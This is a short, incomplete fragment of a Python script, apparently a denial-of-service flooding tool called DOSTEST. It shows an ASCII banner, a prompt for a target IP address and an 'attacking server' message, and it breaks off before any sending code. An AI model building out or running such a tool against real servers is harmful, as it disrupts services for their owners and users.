...
#Banner :
print('''
_____   ___  _____ _____ _____ ___ ______  
|  _ \ / _ \/ ___|_   _| ____/ ___|_   _|
| | | | | | \___ \ | | |  _| \___ \ | |  
| |_| | |_| |___) || | | |___ ___) || |  
|____/ \___/|____/ |_| |_____|____/ |_|  

    *       Author: Gagan | Ravinth | Aditya       *
    *                                              *
    ************************************************
    ************************************************
    *                                              *    
    ...
    *  4. Does DOSTEST suit in villain role, huh?  *
    ************************************************
	''')
#Type your ip and port number (find IP address using nslookup or any online website) 
ip = input(" [+] Give DOSTEST A Target IP : ")
...
print(" " )
print(" [+] DOSTEST is attacking server " + ip )
print (" " )
time.sleep(5)
sent = 0
try :
